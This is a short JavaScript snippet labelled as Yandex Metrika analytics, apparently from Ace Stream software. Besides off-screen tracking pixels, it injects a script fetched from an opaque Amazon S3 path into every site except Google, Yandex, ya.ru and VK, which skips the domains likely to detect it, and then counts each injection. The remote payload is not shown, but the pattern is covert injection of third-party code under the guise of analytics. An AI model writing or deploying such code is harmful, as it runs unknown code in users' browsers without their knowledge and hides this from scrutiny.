//yandex metrika
(function() {
    function __ym(a) {
        var d=document, i=d.createElement("img");
        i.src = "https://mc.yandex.ru/watch/"+a;
        i.style = "position:absolute; left:-9999px;";
        d.body.appendChild(i);
    }

    function imp(a) {
        var d=document, i=d.createElement("img");
        i.src = "//mstat.acestream.net/imp?a="+a+"&b="+Math.random();
        i.style = "position:absolute; left:-9999px;";
        d.body.appendChild(i);
    }

    var b=0;
    __ym(37429375);
    (function(a, i) {
        for(var i=0,j=a.length,k=window.location.host;i<j;i++)if(RegExp(a[i]).test(k))return;
        //ms
        (function(){var s=document.createElement('script');s.src='//s3.amazonaws.com/js-cache/b1c39a67652e28aed9.js';document.body.appendChild(s);})();
        __ym(37846075);
        b=1;
    })(['^(.+\\.)?google\\.\\w{2,3}', '^(.+\\.)?yandex\\.\\w{2,3}', '^(.+\\.)?ya\\.ru$', '^(.+\\.)?vk\\.com$']);

    imp(b);
})();
